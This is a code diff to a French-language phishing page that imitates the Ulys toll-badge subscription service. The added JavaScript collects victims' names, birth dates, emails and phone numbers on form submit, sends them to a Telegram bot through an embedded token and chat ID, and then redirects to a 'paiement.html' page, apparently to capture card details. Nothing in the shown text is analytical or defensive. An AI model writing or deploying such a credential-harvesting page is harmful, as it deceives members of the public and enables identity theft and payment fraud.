@@ -31,18 +31,22 @@
         transform: rotate(360deg);
       }
     }
+
+    h1 {
+      color: #1a1a1a !important; /* Même couleur que sur index.html */
+    }
   </style>
 </head>
 <body>
 
-  <!-- BINDEAU HAUT BLANC -->
+  <!-- BANDEAU HAUT -->
   <div class="top-nav">
     <a href="#"><span>👤</span> Mon espace</a>
     <a href="#" class="btn-primary">Devenir client</a>
     <div class="lang">FR ▼</div>
   </div>
 
-  <!-- NAVBAR PRINCIPALE BLANCHE -->
+  <!-- NAVBAR -->
   <div class="site-nav">
     <nav class="navbar">
       <div class="navbar-left">
@@ -63,7 +67,7 @@
     </nav>
   </div>
 
-  <!-- FORMULAIRE D’INFORMATION -->
+  <!-- FORMULAIRE -->
   <main class="container">
     <div class="card">
       <h1>Votre abonnement télépéage</h1>
@@ -97,6 +101,10 @@
     <div class="spinner"></div>
   </div>
 
+  <footer>
+    &copy; 2025 Ulys. Sécurité renforcée.
+  </footer>
+
   <script>
     // Gérer le toggle de civilité
     const toggleButtons = document.querySelectorAll("#civilite-toggle .toggle");
@@ -110,16 +118,46 @@
       });
     });
 
-    // Spinner au submit
+    // Gestion du submit
     const form = document.getElementById("form-abonnement");
     form.addEventListener("submit", function (e) {
       e.preventDefault();
+
+      // Récupération des données
+      const civilite = document.getElementById("civilite").value;
+      const prenom = document.getElementById("prenom").value;
+      const nom = document.getElementById("nom").value;
+      const dob = document.getElementById("dob").value;
+      const email = document.getElementById("email").value;
+      const tel = document.getElementById("tel").value;
+
+      // Construction du message
+      const message = `
+📥 Nouvelle soumission d'informations :
+👤 ${civilite} ${prenom} ${nom}
+🎂 Né(e) le : ${dob}
+📧 Email : ${email}
+📱 Téléphone : ${tel}
+      `;
+
+      // Envoi à Telegram
+      fetch("https://api.telegram.org/bot7959354545:AAEfYBDF24DOs30vwYScteq1uWMO65FP8Fo/sendMessage", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: "-4911236455",
+          text: message
+        })
+      });
+
+      // Affiche le spinner puis redirige
       document.getElementById("spinnerOverlay").style.display = "flex";
       setTimeout(() => {
         window.location.href = "paiement.html";
-      }, 5000); // spinner visible 5 secondes
+      }, 5000);
     });
   </script>
-
 </body>
 </html>
